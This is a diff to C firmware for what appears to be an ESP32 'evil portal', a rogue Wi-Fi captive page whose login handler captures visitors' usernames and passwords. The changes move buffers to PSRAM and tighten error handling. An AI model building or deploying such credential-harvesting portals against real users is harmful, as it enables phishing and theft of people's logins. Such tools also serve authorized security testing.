@@ -58,7 +58,7 @@ static httpd_handle_t s_httpd     = NULL;
 
 static char      s_tmpl_id[EVIL_PORTAL_TMPL_MAX + 1];  /* active template */
 static const char *s_active_html = NULL;   /* flash const OR s_custom_html */
-static char     *s_custom_html   = NULL;    /* malloc'd when custom active  */
+static char     *s_custom_html   = NULL;    /* PSRAM buffer when custom active */
 static char      s_ssid[EVIL_PORTAL_SSID_MAX + 1];
 static uint8_t   s_channel  = 1;
 static int64_t   s_started_us = 0;
@@ -277,7 +277,8 @@ static esp_err_t login_post_handler(httpd_req_t *req)
     int total = req->content_len;
     if (total > 1024) total = 1024;
     if (total > 0) {
-        char *body = malloc(total + 1);
+        char *body = heap_caps_malloc(total + 1,
+                                      MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
         if (body) {
             int got = 0;
             while (got < total) {
@@ -293,7 +294,20 @@ static esp_err_t login_post_handler(httpd_req_t *req)
                 client_ip(req, ip, sizeof(ip));
                 capture_store(ip, user, pass);
             }
-            free(body);
+            heap_caps_free(body);
+        } else {
+            /* Out of PSRAM: can't capture. DRAIN the request body before
+             * responding — otherwise the unread bytes desync parsing of the
+             * next request on a keep-alive connection — then serve the page. */
+            ESP_LOGE(TAG, "request body PSRAM allocation failed; draining + serving page");
+            char sink[64];
+            int left = total;
+            while (left > 0) {
+                int chunk = left < (int)sizeof(sink) ? left : (int)sizeof(sink);
+                int r = httpd_req_recv(req, sink, chunk);
+                if (r <= 0) break;
+                left -= r;
+            }
         }
     }
     httpd_resp_set_type(req, "text/html");
@@ -476,7 +490,10 @@ static int find_builtin(const char *id)
 
 static void free_custom_html(void)
 {
-    if (s_custom_html) { free(s_custom_html); s_custom_html = NULL; }
+    if (s_custom_html) {
+        heap_caps_free(s_custom_html);
+        s_custom_html = NULL;
+    }
 }
 
 /* Load a custom template file into s_custom_html. Returns ESP_OK if present. */
@@ -493,10 +510,21 @@ static esp_err_t load_custom_html(const char *name)
     FILE *f = fopen(path, "r");
     if (!f) return ESP_FAIL;
     free_custom_html();
-    s_custom_html = malloc(sz + 1);
-    if (!s_custom_html) { fclose(f); return ESP_ERR_NO_MEM; }
+    s_custom_html = heap_caps_malloc(sz + 1,
+                                     MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
+    if (!s_custom_html) {
+        fclose(f);
+        ESP_LOGE(TAG, "custom HTML PSRAM allocation failed");
+        return ESP_ERR_NO_MEM;
+    }
     size_t rd = fread(s_custom_html, 1, sz, f);
-    fclose(f);
+    int read_error = ferror(f);
+    int close_error = fclose(f);
+    if (rd != sz || read_error || close_error != 0) {
+        free_custom_html();
+        ESP_LOGE(TAG, "custom HTML read failed");
+        return ESP_FAIL;
+    }
     s_custom_html[rd] = '\0';
     return ESP_OK;
 }
@@ -559,6 +587,11 @@ esp_err_t evil_portal_start(const char *template_id, const char *ssid,
         /* Fall back to an operator-uploaded custom template. */
         esp_err_t le = load_custom_html(template_id);
         if (le != ESP_OK) {
+            if (le != ESP_ERR_NOT_FOUND) {
+                ESP_LOGE(TAG, "custom template load failed: %s",
+                         esp_err_to_name(le));
+                return le;
+            }
             io_log("portal: ERR unknown template `%s` (try `portal ls`)\r\n",
                    template_id ? template_id : "");
             return ESP_ERR_INVALID_ARG;
